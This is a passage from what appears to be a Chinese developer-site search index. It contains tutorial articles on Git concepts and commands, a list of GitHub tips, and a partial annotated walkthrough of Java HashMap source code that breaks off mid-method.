有时候会混淆所在的工作目录，一不小心会写错文件或者覆盖意想外的文件。\n为了解决这个问题，人们很久以前就开发了许多种本地版本控制系统，大多都是采用某种简单的数据库来记录文件的历次更新差异。\n集中化的版本控制系统    接下来人们又遇到一个问题，如何让在不同系统上的开发者协同工作？ 于是，集中化的版本控制系统（Centralized Version Control Systems，简称 CVCS）应运而生。\n集中化的版本控制系统都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。\n这么做虽然解决了本地版本控制系统无法让在不同系统上的开发者协同工作的诟病，但也还是存在下面的问题：\n 单点故障： 中央服务器宕机，则其他人无法使用；如果中心数据库磁盘损坏又没有进行备份，你将丢失所有数据。本地版本控制系统也存在类似问题，只要整个项目的历史记录被保存在单一位置，就有丢失所有历史更新记录的风险。 必须联网才能工作： 受网络状况、带宽影响。  分布式版本控制系统    于是分布式版本控制系统（Distributed Version Control System，简称 DVCS）面世了。 Git 就是一个典型的分布式版本控制系统。\n这类系统，客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。 这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。\n分布式版本控制系统可以不用联网就可以工作，因为每个人的电脑上都是完整的版本库，当你修改了某个文件后，你只需要将自己的修改推送给别人就可以了。但是，在实际使用分布式版本控制系统的时候，很少会直接进行推送修改，而是使用一台充当“中央服务器”的东西。这个服务器的作用仅仅是用来方便“交换”大家的修改，没有它大家也一样干活，只是交换修改不方便而已。\n分布式版本控制系统的优势不单是不必联网这么简单，后面我们还会看到 Git 极其强大的分支管理等功能。\n认识 Git    Git 简史    Linux 内核项目组当时使用分布式版本控制系统 BitKeeper 来管理和维护代码。但是，后来开发 BitKeeper 的商业公司同 Linux 内核开源社区的合作关系结束，他们收回了 Linux 内核社区免费使用 BitKeeper 的权力。 Linux 开源社区（特别是 Linux 的缔造者 Linus Torvalds）基于使用 BitKeeper 时的经验教训，开发出自己的版本系统，而且对新的版本控制系统做了很多改进。\nGit 与其他版本管理系统的主要区别    Git 在保存和对待各种信息的时候与其它版本控制系统有很大差异，尽管操作起来的命令形式非常相近，理解这些差异将有助于防止你使用中的困惑。\n下面我们主要说一个关于 Git 与其他版本管理系统的主要差别：对待数据的方式。\nGit采用的是直接记录快照的方式，而非差异比较。我后面会详细介绍这两种方式的差别。\n大部分版本控制系统（CVS、Subversion、Perforce、Bazaar 等等）都是以文件变更列表的方式存储信息，这类系统将它们保存的信息看作是一组基本文件和每个文件随时间逐步累积的差异。\n具体原理如下图所示，理解起来其实很简单，每当我们提交更新一个文件之后，系统都会记录这个文件做了哪些更新，以增量符号Δ(Delta)表示。\n  我们怎样才能得到一个文件的最终版本呢？\n很简单，高中数学的基本知识，我们只需要将这些原文件和这些增加进行相加就行了。\n这种方式有什么问题呢？\n比如我们的增量特别特别多的话，如果我们要得到最终的文件是不是会耗费时间和性能。\nGit 不按照以上方式对待或保存数据。 反之，Git 更像是把数据看作是对小型文件系统的一组快照。 每次你提交更新，或在 Git 中保存项目状态时，它主要对当时的全部文件制作一个快照并保存这个快照的索引。 为了高效，如果文件没有修改，Git 不再重新存储该文件，而是只保留一个链接指向之前存储的文件。 Git 对待数据更像是一个 快照流。\n  Git 的三种状态    Git 有三种状态，你的文件可能处于其中之一：\n 已提交（committed）：数据已经安全的保存在本地数据库中。 已修改（modified）：已修改表示修改了文件，但还没保存到数据库中。 已暂存（staged）：表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。  由此引入 Git 项目的三个工作区域的概念：Git 仓库(.git directory)、工作目录(Working Directory) 以及 暂存区域(Staging Area) 。\n 基本的 Git 工作流程如下：\n 在工作目录中修改文件。 暂存文件，将文件的快照放入暂存区域。 提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录。  Git 使用快速入门    获取 Git 仓库    有两种取得 Git 项目仓库的方法。\n 在现有目录中初始化仓库: 进入项目目录运行 git init 命令,该命令将创建一个名为 .git 的子目录。 从一个服务器克隆一个现有的 Git 仓库: git clone [url] 自定义本地仓库的名字: git clone [url] directoryname  记录每次更新到仓库     检测当前文件状态 : git status 提出更改（把它们添加到暂存区）：git add filename  (针对特定文件)、git add *(所有文件)、git add *.txt（支持通配符，所有 .txt 文件） 忽略文件：.gitignore 文件 提交更新: git commit -m \u0026quot;代码提交信息\u0026quot; （每次准备提交前，先用 git status 看下，是不是都已暂存起来了， 然后再运行提交命令 git commit） 跳过使用暂存区域更新的方式 : git commit -a -m \u0026quot;代码提交信息\u0026quot;。 git commit 加上 -a 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤。 移除文件 ：git rm filename （从暂存区域移除，然后提交。） 对文件重命名 ：git mv README.md README(这个命令相当于mv README.md README、git rm README.md、git add README 这三条命令的集合)  一个好的 Git 提交消息    一个好的 Git 提交消息如下：\n标题行：用这一行来描述和解释你的这次提交 主体部分可以是很少的几行，来加入更多的细节来解释提交，最好是能给出一些相关的背景或者解释这个提交能修复和解决什么问题。 主体部分当然也可以有几段，但是一定要注意换行和句子不要太长。因为这样在使用 \u0026quot;git log\u0026quot; 的时候会有缩进比较好看。  提交的标题行描述应该尽量的清晰和尽量的一句话概括。这样就方便相关的 Git 日志查看工具显示和其他人的阅读。\n推送改动到远程仓库      如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：git remote add origin \u0026lt;server\u0026gt; ,比如我们要让本地的一个仓库和 Github 上创建的一个仓库关联可以这样git remote add origin https://github.com/Snailclimb/test.git\n  将这些改动提交到远端仓库：git push origin master (可以把 master 换成你想要推送的任何分支)\n如此你就能够将你的改动推送到所添加的服务器上去了。\n  远程仓库的移除与重命名     将 test 重命名为 test1：git remote rename test test1 移除远程仓库 test1:git remote rm test1  查看提交历史    在提交了若干更新，又或者克隆了某个项目之后，你也许想回顾下提交历史。 完成这个任务最简单而又有效的工具是 git log 命令。git log 会按提交时间列出所有的更新，最近的更新排在最上面。\n可以添加一些参数来查看自己希望看到的内容：\n只看某个人的提交记录：\ngit log --author=bob 撤销操作    有时候我们提交完了才发现漏掉了几个文件没有添加，或者提交信息写错了。 此时，可以运行带有 --amend 选项的提交命令尝试重新提交：\ngit commit --amend 取消暂存的文件\ngit reset filename 撤消对文件的修改:\ngit checkout -- filename 假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：\ngit fetch origin git reset --hard origin/master 分支    分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是“默认”的分支。在其他分支上进行开发，完成后再将它们合并到主分支上。\n我们通常在开发新功能、修复一个紧急 bug 等等时候会选择创建分支。单分支开发好还是多分支开发好，还是要看具体场景来说。\n创建一个名字叫做 test 的分支\ngit branch test 切换当前分支到 test（当你切换分支的时候，Git 会重置你的工作目录，使其看起来像回到了你在那个分支上最后一次提交的样子。 Git 会自动添加、删除、修改文件以确保此时你的工作目录和这个分支最后一次提交时的样子一模一样）\ngit checkout test  你也可以直接这样创建分支并切换过去(上面两条命令的合写)\ngit checkout -b feature_x 切换到主分支\ngit checkout master 合并分支(可能会有冲突)\ngit merge test 把新建的分支删掉\ngit branch -d feature_x 将分支推送到远端仓库（推送成功后其他人可见）：\ngit push origin 推荐    在线演示学习工具：\n「补充，来自issue729」Learn Git Branching https://oschina.gitee.io/learn-git-branching/ 。该网站可以方便的演示基本的git操作，讲解得明明白白。每一个基本命令的作用和结果。\n推荐阅读：\n Git - 简明指南 图解Git 猴子都能懂得Git入门 https://git-scm.com/book/en/v2 Generating a new SSH key and adding it to the ssh-agent 一个好的 Git 提交消息，出自 Linus 之手  "},{"id":181,"href":"/%E7%AC%94%E8%AE%B0/Git/","title":"Git","parent":"笔记","content":"Git     Git  集中式与分布式 中心服务器 工作流 分支实现 冲突 Fast forward 储藏（Stashing） SSH 传输设置 .gitignore 文件 Git 命令一览 参考资料    集中式与分布式    Git 属于分布式版本控制系统，而 SVN 属于集中式。\n\n集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。\n集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。\n集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。\n分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。\n中心服务器    中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。\nGithub 就是一个中心服务器。\n工作流    新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。\nGit 的版本库有一个称为 Stage 的暂存区以及最后的 History 版本库，History 存储所有分支信息，使用一个 HEAD 指针指向当前分支。\n\n git add files 把文件的修改添加到暂存区 git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了 git reset \u0026ndash; files 使用当前分支上的修改覆盖暂存区，用来撤销最后一次 git add files git checkout \u0026ndash; files 使用暂存区的修改覆盖工作目录，用来撤销本地修改  \n可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。\n git commit -a 直接把所有文件的修改添加到暂存区然后执行提交 git checkout HEAD \u0026ndash; files 取出最后一次修改，可以用来进行回滚操作  \n分支实现    使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。\n\n新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支，表示新分支成为当前分支。\n\n每次提交只会让当前分支指针向前移动，而其它分支指针不会移动。\n\n合并分支也只需要改变指针即可。\n\n冲突    当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。\n\nGit 会使用 \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; ，======= ，\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。\n\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD Creating a new branch is quick \u0026amp; simple. ======= Creating a new branch is quick AND simple. \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; feature1 Fast forward    \u0026ldquo;快进式合并\u0026rdquo;（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。\n可以在合并时加上 \u0026ndash;no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。\n$ git merge --no-ff -m \u0026quot;merge with no-ff\u0026quot; dev \n储藏（Stashing）    在一个分支上操作之后，如果还没有将修改提交到分支上，此时进行切换分支，那么另一个分支上也能看到新的修改。这是因为所有分支都共用一个工作区的缘故。\n可以使用 git stash 将当前分支的修改储藏起来，此时当前工作区的所有修改都会被存到栈中，也就是说当前工作区是干净的，没有任何未提交的修改。此时就可以安全的切换到其它分支上了。\n$ git stash Saved working directory and index state \\ \u0026quot;WIP on master: 049d078 added the index file\u0026quot; HEAD is now at 049d078 added the index file (To restore them type \u0026quot;git stash apply\u0026quot;) 该功能可以用于 bug 分支的实现。如果当前正在 dev 分支上进行开发，但是此时 master 上有个 bug 需要修复，但是 dev 分支上的开发还未完成，不想立即提交。在新建 bug 分支并切换到 bug 分支之前就需要使用 git stash 将 dev 分支的未提交修改储藏起来。\nSSH 传输设置    Git 仓库和 Github 中心仓库之间的传输是通过 SSH 加密。\n如果工作区下没有 .ssh 目录，或者该目录下没有 id_rsa 和 id_rsa.pub 这两个文件，可以通过以下命令来创建 SSH Key：\n$ ssh-keygen -t rsa -C \u0026quot;youremail@example.com\u0026quot; 然后把公钥 id_rsa.pub 的内容复制到 Github \u0026ldquo;Account settings\u0026rdquo; 的 SSH Keys 中。\n.gitignore 文件    忽略以下文件：\n 操作系统自动生成的文件，比如缩略图； 编译生成的中间文件，比如 Java 编译产生的 .class 文件； 自己的敏感信息，比如存放口令的配置文件。  不需要全部自己编写，可以到 https://github.com/github/gitignore 中进行查询。\nGit 命令一览    \n比较详细的地址：http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf\n参考资料     Git - 简明指南 图解 Git 廖雪峰 : Git 教程 Learn Git Branching  "},{"id":182,"href":"/tools/Github%E6%8A%80%E5%B7%A7/","title":"Github技巧","parent":"tools","content":"我使用 Github 已经有 5 年多了，今天毫无保留地把自己觉得比较有用的 Github 小技巧送给关注 JavaGuide 的各位小伙伴。\n这篇文章肝了很久，就挺用心的，大家看内容就知道了。\n如果觉得有收获的话，不要白嫖！点个赞/在看就是对我最大的鼓励。你要是可以三连（点赞+在看+转发）的话，我就更爽了（我在想屁吃？）。\n1. 一键生成 Github 简历    通过 https://resume.github.io/ 这个网站你可以一键生成一个在线的 Github 简历。\n当时我参加的校招的时候，个人信息那里就放了一个在线的 Github 简历。我觉得这样会让面试官感觉你是一个内行，会提高一些印象分。\n但是，如果你的 Github 没有什么项目的话还是不要放在简历里面了。生成后的效果如下图所示。\n2. 个性化 Github 首页    Github 目前支持在个人主页自定义展示一些内容。展示效果如下图所示。\n想要做到这样非常简单，你只需要创建一个和你的 Github 账户同名的仓库，然后自定义README.md的内容即可。\n展示在你主页的自定义内容就是README.md的内容（不会 Markdown 语法的小伙伴自行面壁 5 分钟）。\n这个也是可以玩出花来的！比如说：通过 github-readme-stats 这个开源项目，你可以 README 中展示动态生成的 GitHub 统计信息。展示效果如下图所示。\n关于个性化首页这个就不多提了，感兴趣的小伙伴自行研究一下。\n3. 自定义项目徽章    你在 Github 上看到的项目徽章都是通过 https://shields.io/ 这个网站生成的。我的 JavaGuide 这个项目的徽章如下图所示。\n并且，你不光可以生成静态徽章，shield.io 还可以动态读取你项目的状态并生成对应的徽章。\n生成的描述项目状态的徽章效果如下图所示。\n4. Github 表情    如果你想要在 Github 使用表情的话，可以在这里找找 ：www.webfx.com/tools/emoji-cheat-sheet/ 。\n5. 高效阅读 Github 项目的源代码    Github 前段时间推出的 Codespaces 可以提供类似 VS Code 的在线 IDE，不过目前还没有完全开发使用。\n简单介绍几种我最常用的阅读 Github 项目源代码的方式。\n5.1. Chrome 插件 Octotree    这个已经老生常谈了，是我最喜欢的一种方式。使用了 Octotree 之后网页侧边栏会按照树形结构展示项目，为我们带来 IDE 般的阅读源代码的感受。\n5.2. Chrome 插件 SourceGraph    我不想将项目 clone 到本地的时候一般就会使用这种方式来阅读项目源代码。SourceGraph 不仅可以让我们在 Github 优雅的查看代码，它还支持一些骚操作，比如：类之间的跳转、代码搜索等功能。\n当你下载了这个插件之后，你的项目主页会多出一个小图标如下图所示。点击这个小图标即可在线阅读项目源代码。\n使用 SourceGraph 阅读代码的就像下面这样，同样是树形结构展示代码，但是我个人感觉没有 Octotree 的手感舒服。不过，SourceGraph 内置了很多插件，而且还支持类之间的跳转！\n5.3. 克隆项目到本地    先把项目克隆到本地，然后使用自己喜欢的 IDE 来阅读。可以说是最酸爽的方式了！\n如果你想要深入了解某个项目的话，首选这种方式。一个git clone 就完事了。\n5.4. 其他    如果你要看的是前端项目的话，还可以考虑使用 https://stackblitz.com/ 这个网站。\n这个网站会提供一个类似 VS Code 的在线 IDE。\n6. 扩展 Github 的功能    Enhanced GitHub 可以让你的 Github 更好用。这个 Chrome 插件可以可视化你的 Github 仓库大小，每个文件的大小并且可以让你快速下载单个文件。\n7. 自动为 Markdown 文件生成目录    如果你想为 Github 上的 Markdown 文件生成目录的话，通过 VS Code 的 Markdown Preview Enhanced 这个插件就可以了。\n生成的目录效果如下图所示。你直接点击目录中的链接即可跳转到文章对应的位置，可以优化阅读体验。\n8. 后记    这篇文章是我上周六的时候坐在窗台写的，花了一下午时间。\n除了我提到的这些技巧之外，像 Github 搜索技巧、GitHub Actions 等内容的话，我这里没有提，感兴趣的小伙伴自行研究一下。\n这里多说一句心里话： Github 搜索技巧不必要记网上那些文章说的各种命令啥的，真没啥卵用。你会发现你用的最多的还是关键字搜索以及 Github 自带的筛选功能。\n"},{"id":183,"href":"/java/collection/HashMap%E6%BA%90%E7%A0%81+%E5%BA%95%E5%B1%82%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/","title":"HashMap源码+底层数据结构分析","parent":"collection","content":" HashMap 简介 底层数据结构分析  JDK1.8 之前 JDK1.8 之后   HashMap 源码分析  构造方法 put 方法 get 方法 resize 方法   HashMap 常用方法测试   感谢 changfubai 对本文的改进做出的贡献！\n HashMap 简介    HashMap 主要用来存放键值对，它基于哈希表的 Map 接口实现，是常用的 Java 集合之一，是非线程安全的。\nHashMap 可以存储 null 的 key 和 value，但 null 作为键只能有一个，null 作为值可以有多个\nJDK1.8 之前 HashMap 由 数组+链表 组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。 JDK1.8 以后的 HashMap 在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。\nHashMap 默认的初始化大小为 16。之后每次扩充，容量变为原来的 2 倍。并且， HashMap 总是使用 2 的幂作为哈希表的大小。\n底层数据结构分析    JDK1.8 之前    JDK1.8 之前 HashMap 底层是 数组和链表 结合在一起使用也就是 链表散列。\nHashMap 通过 key 的 hashCode 经过扰动函数处理过后得到 hash 值，然后通过 (n - 1) \u0026amp; hash 判断当前元素存放的位置（这里的 n 指的是数组的长度），如果当前位置存在元素的话，就判断该元素与要存入的元素的 hash 值以及 key 是否相同，如果相同的话，直接覆盖，不相同就通过拉链法解决冲突。\n所谓扰动函数指的就是 HashMap 的 hash 方法。使用 hash 方法也就是扰动函数是为了防止一些实现比较差的 hashCode() 方法 换句话说使用扰动函数之后可以减少碰撞。\nJDK 1.8 HashMap 的 hash 方法源码:\nJDK 1.8 的 hash 方法 相比于 JDK 1.7 hash 方法更加简化，但是原理不变。\nstatic final int hash(Object key) { int h; // key.hashCode()：返回散列值也就是hashcode  // ^ ：按位异或  // \u0026gt;\u0026gt;\u0026gt;:无符号右移，忽略符号位，空位都以0补齐  return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } 对比一下 JDK1.7 的 HashMap 的 hash 方法源码.\nstatic int hash(int h) { // This function ensures that hashCodes that differ only by  // constant multiples at each bit position have a bounded  // number of collisions (approximately 8 at default load factor).  h ^= (h \u0026gt;\u0026gt;\u0026gt; 20) ^ (h \u0026gt;\u0026gt;\u0026gt; 12); return h ^ (h \u0026gt;\u0026gt;\u0026gt; 7) ^ (h \u0026gt;\u0026gt;\u0026gt; 4); } 相比于 JDK1.8 的 hash 方法 ，JDK 1.7 的 hash 方法的性能会稍差一点点，因为毕竟扰动了 4 次。\n所谓 “拉链法” 就是：将链表和数组相结合。也就是说创建一个链表数组，数组中每一格就是一个链表。若遇到哈希冲突，则将冲突的值加到链表中即可。\nJDK1.8 之后    相比于之前的版本，JDK1.8 以后在解决哈希冲突时有了较大的变化。\n当链表长度大于阈值（默认为 8）时，会首先调用 treeifyBin()方法。这个方法会根据 HashMap 数组来决定是否转换为红黑树。只有当数组长度大于或者等于 64 的情况下，才会执行转换红黑树操作，以减少搜索时间。否则，就是只是执行 resize() 方法对数组扩容。相关源码这里就不贴了，重点关注 treeifyBin()方法即可！\n类的属性：\npublic class HashMap\u0026lt;K,V\u0026gt; extends AbstractMap\u0026lt;K,V\u0026gt; implements Map\u0026lt;K,V\u0026gt;, Cloneable, Serializable { // 序列号  private static final long serialVersionUID = 362498820763181265L; // 默认的初始容量是16  static final int DEFAULT_INITIAL_CAPACITY = 1 \u0026lt;\u0026lt; 4; // 最大容量  static final int MAXIMUM_CAPACITY = 1 \u0026lt;\u0026lt; 30; // 默认的填充因子  static final float DEFAULT_LOAD_FACTOR = 0.75f; // 当桶(bucket)上的结点数大于这个值时会转成红黑树  static final int TREEIFY_THRESHOLD = 8; // 当桶(bucket)上的结点数小于这个值时树转链表  static final int UNTREEIFY_THRESHOLD = 6; // 桶中结构转化为红黑树对应的table的最小大小  static final int MIN_TREEIFY_CAPACITY = 64; // 存储元素的数组，总是2的幂次倍  transient Node\u0026lt;k,v\u0026gt;[] table; // 存放具体元素的集  transient Set\u0026lt;map.entry\u0026lt;k,v\u0026gt;\u0026gt; entrySet; // 存放元素的个数，注意这个不等于数组的长度。  transient int size; // 每次扩容和更改map结构的计数器  transient int modCount; // 临界值 当实际大小(容量*填充因子)超过临界值时，会进行扩容  int threshold; // 加载因子  final float loadFactor; }   loadFactor 加载因子\nloadFactor 加载因子是控制数组存放数据的疏密程度，loadFactor 越趋近于 1，那么 数组中存放的数据(entry)也就越多，也就越密，也就是会让链表的长度增加，loadFactor 越小，也就是趋近于 0，数组中存放的数据(entry)也就越少，也就越稀疏。\nloadFactor 太大导致查找元素效率低，太小导致数组的利用率低，存放的数据会很分散。loadFactor 的默认值为 0.75f 是官方给出的一个比较好的临界值。\n给定的默认容量为 16，负载因子为 0.75。Map 在使用过程中不断的往里面存放数据，当数量达到了 16 * 0.75 = 12 就需要将当前 16 的容量进行扩容，而扩容这个过程涉及到 rehash、复制数据等操作，所以非常消耗性能。\n  threshold\nthreshold = capacity * loadFactor，当 Size\u0026gt;=threshold的时候，那么就要考虑对数组的扩增了，也就是说，这个的意思就是 衡量数组是否需要扩增的一个标准。\n  Node 节点类源码:\n// 继承自 Map.Entry\u0026lt;K,V\u0026gt; static class Node\u0026lt;K,V\u0026gt; implements Map.Entry\u0026lt;K,V\u0026gt; { final int hash;// 哈希值，存放元素到hashmap中时用来与其他元素hash值比较  final K key;//键  V value;//值  // 指向下一个节点  Node\u0026lt;K,V\u0026gt; next; Node(int hash, K key, V value, Node\u0026lt;K,V\u0026gt; next) { this.hash = hash; this.key = key; this.value = value; this.next = next; } public final K getKey() { return key; } public final V getValue() { return value; } public final String toString() { return key + \u0026#34;=\u0026#34; + value; } // 重写hashCode()方法  public final int hashCode() { return Objects.hashCode(key) ^ Objects.hashCode(value); } public final V setValue(V newValue) { V oldValue = value; value = newValue; return oldValue; } // 重写 equals() 方法  public final boolean equals(Object o) { if (o == this) return true; if (o instanceof Map.Entry) { Map.Entry\u0026lt;?,?\u0026gt; e = (Map.Entry\u0026lt;?,?\u0026gt;)o; if (Objects.equals(key, e.getKey()) \u0026amp;\u0026amp; Objects.equals(value, e.getValue())) return true; } return false; } } 树节点类源码:\nstatic final class TreeNode\u0026lt;K,V\u0026gt; extends LinkedHashMap.Entry\u0026lt;K,V\u0026gt; { TreeNode\u0026lt;K,V\u0026gt; parent; // 父  TreeNode\u0026lt;K,V\u0026gt; left; // 左  TreeNode\u0026lt;K,V\u0026gt; right; // 右  TreeNode\u0026lt;K,V\u0026gt; prev; // needed to unlink next upon deletion  boolean red; // 判断颜色  TreeNode(int hash, K key, V val, Node\u0026lt;K,V\u0026gt; next) { super(hash, key, val, next); } // 返回根节点  final TreeNode\u0026lt;K,V\u0026gt; root() { for (TreeNode\u0026lt;K,V\u0026gt; r = this, p;;) { if ((p = r.parent) == null) return r; r = p; } HashMap 源码分析    构造方法    HashMap 中有四个构造方法，它们分别如下：\n// 默认构造函数。  public HashMap() { this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted  } // 包含另一个“Map”的构造函数  public HashMap(Map\u0026lt;? extends K, ? extends V\u0026gt; m) { this.loadFactor = DEFAULT_LOAD_FACTOR; putMapEntries(m, false);//下面会分析到这个方法  } // 指定“容量大小”的构造函数  public HashMap(int initialCapacity) { this(initialCapacity, DEFAULT_LOAD_FACTOR); } // 指定“容量大小”和“加载因子”的构造函数  public HashMap(int initialCapacity, float loadFactor) { if (initialCapacity \u0026lt; 0) throw new IllegalArgumentException(\u0026#34;Illegal initial capacity: \u0026#34; + initialCapacity); if (initialCapacity \u0026gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); this.loadFactor = loadFactor; this.threshold = tableSizeFor(initialCapacity); } putMapEntries 方法：\nfinal void putMapEntries(Map\u0026lt;? extends K, ? extends V\u0026gt; m, boolean evict) { int s = m.size(); if (s \u0026gt; 0) { // 判断table是否已经初始化  if (table == null) { // pre-size  // 未初始化，s为m的实际元素个数  float ft = ((float)s / loadFactor) + 1.0F; int t = ((ft \u0026lt; (float)MAXIMUM_CAPACITY) ? (int)ft : MAXIMUM_CAPACITY); // 计算得到的t大于阈值，则初始化阈值  if (t \u0026gt; threshold) threshold = tableSizeFor(t); } // 已初始化，并且m元素个数大于阈值，进行扩容处理  else if (s \u0026gt; threshold) resize(); // 将m中的所有元素添加至HashMap中  for (Map.Entry\u0026lt;? extends K, ? extends V\u0026gt; e : m.entrySet()) { K key = e.getKey(); V value = e.getValue(); putVal(hash(key), key, value, false, evict); } } } put 方法    HashMap 只提供了 put 用于添加元素，putVal 方法只是给 put 方法调用的一个方法，并没有提供给用户使用。\n对 putVal 方法添加元素的分析如下：\n 如果定位到的数组位置没有元素 就直接插入。 如果定位到的数组位置有元素就和要插入的 key 比较，如果 key 相同就直接覆盖，如果 key 不相同，就判断 p 是否是一个树节点，如果是就调用e = ((TreeNode\u0026lt;K,V\u0026gt;)p).putTreeVal(this, tab, hash, key, value)将元素添加进入。如果不是就遍历链表插入(插入的是链表尾部)。  说明:上图有两个小问题：\n 直接覆盖之后应该就会 return，不会有后续操作。参考 JDK8 HashMap.java 658 行（issue#608）。 当链表长度大于阈值（默认为 8）并且 HashMap 数组长度超过 64 的时候才会执行链表转红黑树的操作，否则就只是对数组扩容。参考 HashMap 的 treeifyBin() 方法（issue#1087）。  public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node\u0026lt;K,V\u0026gt;[] tab; Node\u0026lt;K,V\u0026gt; p; int n, i; // table未初始化或者长度为0，进行扩容  if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; // (n - 1) \u0026amp; hash 确定元素存放在哪个桶中，桶为空，新生成结点放入桶中(此时，这个结点是放在数组中)  if ((p = tab[i = (n - 1) \u0026amp; hash]) == null) tab[i] = newNode(hash, key, value, null); // 桶中已经存在元素  else { Node\u0026lt;K,V\u0026gt; e; K k; // 比较桶中第一个元素(数组中的结点)的hash值相等，key相等  if (p.hash == hash \u0026amp;\u0026amp; ((k = p.key) == key || (key != null \u0026amp;\u0026amp; key.equals(k)))) // 将第一个元素赋值给e，用e来记录  e = p; // hash值不相等，即key不相等；为红黑树结点  else if (p instanceof TreeNode) // 放入树中  e = ((TreeNode\u0026lt;K,V\u0026gt;)p).putTreeVal(this, tab, hash, key, value); // 为链表结点  else { // 在链表最末插入结点  for (int binCount = 0; ; ++binCount) { // 到达链表的尾部  if ((e = p.next) == null) { // 在尾部插入新结点  p.next = newNode(hash, key, value, null); // 结点数量达到阈值(默认为 8 )，执行 treeifyBin 方法  // 这个方法会根据 HashMap 数组来决定是否转换为红黑树。  // 只有当数组长度大于或者等于 64 的情况下，才会执行转换红黑树操作，以减少搜索时间。否则，就是只是对数组扩容。  if (binCount \u0026gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st  treeifyBin(tab, hash); // 跳出循环  break; } // 判断链表中结点的key值与插入的元素的key值是否相等  if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || (key != null \u0026amp;\u0026amp; key.equals(k)))) // 相等，跳出循环  break; // 用于遍历桶中的链表，与前面的e = p.next组合，可以遍历链表  p = e; } } // 表示在桶中找到key值、hash值与插入元素相等的结点  if (e != null) { // 记录e的value  V oldValue = e.value; // onlyIfAbsent为false或者旧值为null  if (!onlyIfAbsent || oldValue == null) //用新值替换旧值  e.value = value; // 访问后回调  afterNodeAccess(e); // 返回旧值  return oldValue; } } // 结构性修改  ++modCount; // 实际大小大于阈值则扩容  if (++size \u0026gt; threshold) resize(); // 插入后回调  afterNodeInsertion(evict); return null; } 我们再来对比一下 JDK1.7 put 方法的代码\n对于 put 方法的分析如下：\n ① 如果定位到的数组位置没有元素 就直接插入。 ② 如果定位到的数组位置有元素，遍历以这个元素为头结点的链表，依次和插入的 key 比较，如果 key 相同就直接覆盖，不同就采用头插法插入元素。  public V put(K key, V value) if (table == EMPTY_TABLE) { inflateTable(threshold); } if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { // 先遍历  Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); // 再插入  return null; } get 方法    public V get(Object key) { Node\u0026lt;K,V\u0026gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } final Node\u0026lt;K,V\u0026gt; getNode(int hash, Object key) { Node\u0026lt;K,V\u0026gt;[] tab; Node\u0026lt;K,V\u0026gt; first, e; int n; K k; if ((tab = table) != null \u0026amp;\u0026amp; (n = tab.length) \u0026gt; 0 \u0026amp;\u0026amp; (first = tab[(n - 1) \u0026amp; hash]) != null) { // 数组元素相等  if (first.hash == hash \u0026amp;\u0026amp; // always check first node  ((k = first.key) == key || (key != null \u0026amp;\u0026amp; key.equals(k)))) return first; // 桶中不止一个节点  if ((e = first.next) != null) { // 在树中get  if (first instanceof TreeNode) return 